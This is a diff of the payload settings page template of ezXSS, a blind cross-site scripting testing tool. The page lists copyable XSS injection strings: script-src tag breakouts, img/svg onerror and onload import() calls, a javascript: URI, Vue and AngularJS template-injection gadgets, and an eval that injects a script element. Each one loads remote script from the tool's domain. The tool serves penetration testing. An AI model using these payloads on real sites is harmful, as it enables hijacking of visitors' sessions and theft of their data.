@@ -9,7 +9,9 @@
                     <div class="view-header">
                         <div class="header-title">
                             <h3 class="m-b-xs">Payload</h3>
-                            <small>The payloads page lets you customize your payload settings, including extracting additional pages and managing white/blacklisted domains. Use it to edit what information your payloads collect.</small>
+                            <small>The payloads page lets you customize your payload settings, including extracting
+                                additional pages and managing white/blacklisted domains. Use it to edit what information
+                                your payloads collect.</small>
                         </div>
                     </div>
                     <hr>
@@ -22,68 +24,92 @@
                 <div class="col-lg-12">
                     <select class="form-control content-select" id="payloadList" name="payloadList">
                         {%foreach payload}
-                        <option value="{payload->id}" {payload->selected}>Payload #{payload->id} | {payload->name}</option>
+                        <option value="{payload->id}" {payload->selected}>Payload #{payload->id} | {payload->name}
+                        </option>
                         {%/foreach}
                     </select>
                     <br>
                 </div>
 
                 <div class="col-lg-6">
-                    
+
                     <div class="panel panel-filled">
                         <div class="panel-heading">Payloads</div>
-                        <div class="panel-body" style="padding-bottom:2px">
+                        <div class="panel-body" style="padding-bottom: 2px; max-height: 402px; overflow-y: auto;">
                             <div class="form-group">
-                                <label class="control-label">Script src</label><label class="shortboost" domain="{%data domain}" class="control-label"></label>
+                                <label class="control-label">SCRIPT src</label><label class="shortboost"
+                                    domain="{%data domain}" class="control-label"></label>
+                                
                                 <input class="form-control scriptsrc" disabled
                                     value="&lt;script src=//{%data domain}&gt;&lt;/script&gt;"><br>
 
-                                <label class="control-label">Script src with closing tag</label>
+                                <label class="control-label">SCRIPT src with closing tag</label>
                                 <input class="form-control scriptsrc" disabled
                                     value="&quot;&gt;&lt;script src=//{%data domain}&gt;&lt;/script&gt;"><br>
 
-                                <label class="control-label">Script src with closing and opening tag</label>
+                                <label class="control-label">SCRIPT src with closing and opening tag</label>
                                 <input class="form-control scriptsrc" disabled
                                     value="&quot;&gt;&lt;script src=//{%data domain}&gt;&lt;/script&gt;&lt;x=&quot;"><br>
 
-                                <label class="control-label">img onerror with closing tag</label>
+                                <label class="control-label">jQuery</label>
+                                <input class="form-control scriptsrc" disabled
+                                    value="$.getScript(&quot;//{%data domain}&quot;)"><br>
+
+                                <label class="control-label">IMG onerror with closing tag</label>
                                 <input class="form-control scriptsrc" disabled
                                     value="&quot;&gt;&lt;img src onerror=import(&apos;//{%data domain}&apos;)&gt;"><br>
 
-                                <label class="control-label">img onerror no spaces with closing tag</label>
+                                <label class="control-label">IMG onerror no spaces with closing tag</label>
                                 <input class="form-control scriptsrc" disabled
                                     value="&quot;&gt;&lt;img/src/onerror=import(&apos;//{%data domain}&apos;)&gt;"><br>
 
-                                <label class="control-label">svg script with closing tag</label>
+                                <label class="control-label">SVG script with closing tag</label>
                                 <input class="form-control scriptsrc" disabled
                                     value="&quot;&gt;&lt;svg&gt;&lt;script href=//{%data domain} /&gt;"><br>
 
-                                <label class="control-label">svg onload with closing tag</label>
+                                <label class="control-label">SVG onload with closing tag</label>
                                 <input class="form-control scriptsrc" disabled
                                     value="&quot;&gt;&lt;svg/onload=import(&apos;//{%data domain}&apos;)&gt;"><br>
-                             
-                                <label class="control-label">link based URI payload</label>
+
+                                <label class="control-label">Link based URI payload</label>
                                 <input class="form-control scriptsrc" disabled
                                     value="javascript:import(&apos;//{%data domain}&apos;)"><br>
 
-                                <label class="control-label">jQuery</label>
-                                <input class="form-control" disabled 
-                                    value="$.getScript(&quot;//{%data domain}&quot;)"><br>
-                                
                                 <label class="control-label">VueJS v3</label>
-                                <input class="form-control" disabled 
+                                <input class="form-control scriptsrc" disabled
                                     value="{{_openBlock.constructor(&apos;import(&quot;//{%data domain}&quot;)&apos;)()}}"><br>
-                                
+
                                 <label class="control-label">VueJS v2 AngularJS</label>
-                                <input class="form-control" disabled 
+                                <input class="form-control scriptsrc" disabled
                                     value="{{constructor.constructor(&apos;import(&quot;//{%data domain}&quot;)&apos;)()}}"><br>
-                                
+
                                 <label class="control-label">Create Element</label>
-                                <input class="form-control" disabled
+                                <input class="form-control scriptsrc" disabled
                                     value="javascript:eval(&apos;var a=document.createElement(\&apos;script\&apos;);a.src=\&apos;//{%data domain}\&apos;;document.body.appendChild(a)&apos;)">
                             </div>
                         </div>
                     </div>
+
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Persistent mode</div>
+                        <div class="panel-body" style="padding-bottom:0px">
+                            <form class="form" id="persistent" method="post">
+                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                <div class="form-group">
+                                    <label class="checkbox-label">
+                                        <input {%checked cPersistent} class="chkbox" id="persistent-mode"
+                                            name="persistent-mode" type="checkbox">
+                                        <span class="checkbox-custom rectangular"></span>
+                                    </label>
+                                    <p class="checkbox-text">Enable persistent mode [<a
+                                            href="https://github.com/ssl/ezXSS/wiki" target=_blank>?</a>]</p>
+                                    <button name="persistent" type="submit" class="btn"
+                                        style="margin-top:-35px;float:right;">Save</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
 
                 <div class="col-lg-6">
                     <div class="panel panel-filled">
@@ -162,24 +188,6 @@
                         </div>
                     </div>
 
-                    <div class="panel panel-filled">
-                        <div class="panel-heading">Persistent mode</div>
-                        <div class="panel-body" style="padding-bottom:0px">
-                            <form class="form" id="persistent" method="post">
-                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
-                                <div class="form-group">
-                                    <label class="checkbox-label">
-                                        <input {%checked cPersistent} class="chkbox" id="persistent-mode" name="persistent-mode" type="checkbox">
-                                        <span class="checkbox-custom rectangular"></span>
-                                    </label>
-                                    <p class="checkbox-text">Enable persistent mode [<a href="https://github.com/ssl/ezXSS/wiki" target=_blank>?</a>]</p>
-                                    <button name="persistent" type="submit" class="btn" style="margin-top:-35px;float:right;">Save</button>
-                                </div>
-                            </form>
-                        </div>
-                    </div>
-                </div>
-                    
                     <div class="panel panel-filled" style="height:270px">
                         <div class="panel-heading">Secondary Payload</div>
                         <div class="panel-body">
